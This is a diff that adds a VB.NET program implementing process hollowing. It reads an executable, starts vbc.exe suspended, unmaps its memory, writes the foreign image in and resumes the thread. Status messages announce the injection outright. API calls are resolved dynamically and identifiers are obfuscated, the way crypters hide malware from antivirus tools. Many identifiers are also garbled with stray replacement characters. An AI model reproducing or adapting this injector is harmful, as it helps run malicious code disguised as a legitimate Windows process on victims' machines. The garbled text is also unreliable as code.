@@ -1,0 +1,156 @@
+Imports System.Runtime.InteropServices
+Imports System.Text
+
+
+
+    Sub Main()
+        Dim self As String = System.Reflection.Assembly.GetExecutingAssembly.Location()
+        Console.WriteLine("System Loaded.")
+        Dim bankingsystem As Byte() = IO.File.ReadAllBytes("C:\Users\Richie\Documents\Visual Studio 2010\Projects\test\test\bin\Debug\test.exe")
+        Console.WriteLine("Reading Bytes.")
+        Dim payload As String = "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"
+        Console.WriteLine("Injecting.")
+        Dim x As New MxjQu?pIopI : x.fkndihn?eM?(bankingsystem, payload)
+        Console.WriteLine("Success! Injected into " + payload + "!")
+        Console.ReadLine()
+    End Sub
+
+
+
+Public Class MxjQu?pIopI
+Function defaultbrowser() As String
+        defaultbrowser = My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\HTTP\shell\open\command", "", "Not Found")
+        Dim shitplit() As String = Split(defaultbrowser, """")
+        Return shitplit(1)
+    End Function
+    Public Declare Function wi?JiL Lib "kernel32" Alias "LoadLibraryA" (ByVal Bu–? As String) As IntPtr
+
+    Public Declare Function t?R??P Lib "kernel32" Alias "GetProcAddress" (ByVal g??R As IntPtr, ByVal Bu–? As String) As IntPtr
+
+    Function ?QynJNl–uJqao?m(Of T)(ByVal Bu–? As String, ByVal j??? As String) As T
+
+        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(t?R??P(wi?JiL(Bu–?), j???), GetType(T)), Object), T)
+
+    End Function
+
+    Delegate Function i?fxb(ByVal f?hk As IntPtr, ByVal v?jJtLIQB As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+
+    Delegate Function gpJ?Fd(ByVal baqv As IntPtr, ByVal Jme? As IntPtr) As UInteger
+
+    Delegate Function ??HPxn(ByVal baqv As IntPtr, ByVal Jme? As IntPtr, ByRef bufr As IntPtr, ByVal bufrFceFf–Baz As Integer, ByRef tv?u As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
+
+    Delegate Function iQePub(ByVal f?hkead As IntPtr, ByVal lwr? As IntPtr) As UInteger
+
+    Delegate Function mJ?mh?(ByVal f?hk As IntPtr, ByVal v?jJtLIQB As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+
+    Delegate Function ma?jP?(ByVal baqv As IntPtr, ByVal ?bL? As IntPtr, ByVal FceFf–Baz As IntPtr, ByVal znwv As Integer, ByVal Mb?g As Integer) As IntPtr
+
+    Delegate Function rLs?PR(ByVal baqvess As IntPtr, ByVal u?xLaMNd? As IntPtr, ByVal dxLq As Byte(), ByVal nFceFf–Baz As UInteger, ByVal ??llBp??– As Integer) As Boolean
+
+    Public Declare Auto Function Iojupz Lib "kernel32" Alias "CreateProcessW" (ByVal FzaQ As String, ByVal nNLr As StringBuilder, ByVal wJbwxlPiy As IntPtr, ByVal yzjc As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal Q?al As Boolean, ByVal usn As Integer, ByVal ePgQ As IntPtr, ByVal q?By As String, ByVal HatJ As Byte(), ByVal mBNL As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+
+    Private Function ujF–Jnb(ByVal xw??Q?? As Long, Optional ByVal r?yMxqr As Long = &H4) As Integer
+
+        Dim ifcLdbQ As IntPtr
+
+        Dim QHmB??a As Integer
+
+        Dim ?NiR? As ??HPxn = ?QynJNl–uJqao?m(Of ??HPxn)("ntdll", "NtReadVirtualMemory")
+
+        Call ?NiR?(Process.GetCurrentProcess.Handle, xw??Q??, ifcLdbQ, r?yMxqr, QHmB??a)
+
+        Return ifcLdbQ
+
+    End Function
+
+    Public Function fkndihn?eM?(ByVal ?N–pfxaL As Byte(), ByVal F?enk–?b As String) As Boolean
+
+        Try
+
+            Dim l?v?M?o–q As GCHandle = GCHandle.Alloc(?N–pfxaL, GCHandleType.Pinned) : Dim hModuleBase As Integer = l?v?M?o–q.AddrOfPinnedObject : l?v?M?o–q.Free()
+
+            Dim wJbwxlPiy As IntPtr = IntPtr.Zero
+
+            Dim reHonR?du As IntPtr() = New IntPtr(3) {}
+
+            Dim Idc–?b??n As Byte() = New Byte(67) {}
+
+            Dim oxne–?wFe As Integer = BitConverter.ToInt32(?N–pfxaL, 60)
+
+            Dim tr?qtov?m As Integer
+
+            Dim v?jJtLIQB As UInteger() = New UInteger(178) {}
+
+            v?jJtLIQB(0) = &H10002
+
+            Iojupz(Nothing, New StringBuilder(F?enk–?b), wJbwxlPiy, wJbwxlPiy, False, 4, wJbwxlPiy, Nothing, Idc–?b??n, reHonR?du)
+
+            Dim arBcJ?N? As Integer = (hModuleBase + ujF–Jnb(hModuleBase + &H3C))
+
+            tr?qtov?m = ujF–Jnb(arBcJ?N? + &H34)
+
+            Dim jkbd? As gpJ?Fd = ?QynJNl–uJqao?m(Of gpJ?Fd)("ntdll", "NtUnmapViewOfSection")
+
+            jkbd?(reHonR?du(0), tr?qtov?m)
+
+            Dim PNte? As ma?jP? = ?QynJNl–uJqao?m(Of ma?jP?)("kernel32", "VirtualAllocEx")
+
+            Dim u?xLaMNd? As IntPtr = PNte?(reHonR?du(0), tr?qtov?m, ujF–Jnb(arBcJ?N? + &H50), &H3000, &H40)
+
+            Dim s?kJ?pmjP As New IntPtr(BitConverter.ToInt32(?N–pfxaL, oxne–?wFe + &H34))
+
+            Dim FceFf–Baz As New IntPtr(BitConverter.ToInt32(?N–pfxaL, oxne–?wFe + 80))
+
+            Dim ?iPHiPcR? As Integer
+
+            Dim ??llBp??– As Integer
+
+            Dim api8 As rLs?PR = ?QynJNl–uJqao?m(Of rLs?PR)("ntdll", "NtWriteVirtualMemory")
+
+            api8(reHonR?du(0), u?xLaMNd?, ?N–pfxaL, CUInt(CInt(ujF–Jnb(arBcJ?N? + &H54))), ?iPHiPcR?)
+
+            For i = 0 To ujF–Jnb(arBcJ?N? + &H6, 2) - 1
+
+                Dim Ihc?ybIFM As Integer() = New Integer(9) {}
+
+                Buffer.BlockCopy(?N–pfxaL, (oxne–?wFe + &HF8) + (i * 40), Ihc?ybIFM, 0, 40)
+
+                Dim dxzq?ges? As Byte() = New Byte((Ihc?ybIFM(4) - 1)) {}
+
+                Buffer.BlockCopy(?N–pfxaL, Ihc?ybIFM(5), dxzq?ges?, 0, dxzq?ges?.Length)
+
+                FceFf–Baz = New IntPtr(u?xLaMNd?.ToInt32() + Ihc?ybIFM(3))
+
+                s?kJ?pmjP = New IntPtr(dxzq?ges?.Length)
+
+                api8(reHonR?du(0), FceFf–Baz, dxzq?ges?, CUInt(s?kJ?pmjP), ??llBp??–)
+
+            Next i
+
+            Dim Pmlc As i?fxb = ?QynJNl–uJqao?m(Of i?fxb)("ntdll", "NtGetContextThread")
+
+            Pmlc(reHonR?du(1), v?jJtLIQB)
+
+            api8(reHonR?du(0), v?jJtLIQB(41) + &H8, BitConverter.GetBytes(u?xLaMNd?.ToInt32()), CUInt(&H4), ??llBp??–)
+
+            v?jJtLIQB(&H2C) = tr?qtov?m + ujF–Jnb(arBcJ?N? + &H28)
+
+            Dim F??do As mJ?mh? = ?QynJNl–uJqao?m(Of mJ?mh?)("ntdll", "NtSetContextThread")
+
+            F??do(reHonR?du(1), v?jJtLIQB)
+
+            Dim tBdie As iQePub = ?QynJNl–uJqao?m(Of iQePub)("ntdll", "NtResumeThread")
+
+            tBdie(reHonR?du(1), 0)
+
+        Catch ex As Exception
+
+            Return False
+
+        End Try
+
+        Return True
+
+    End Function
+
+End Class
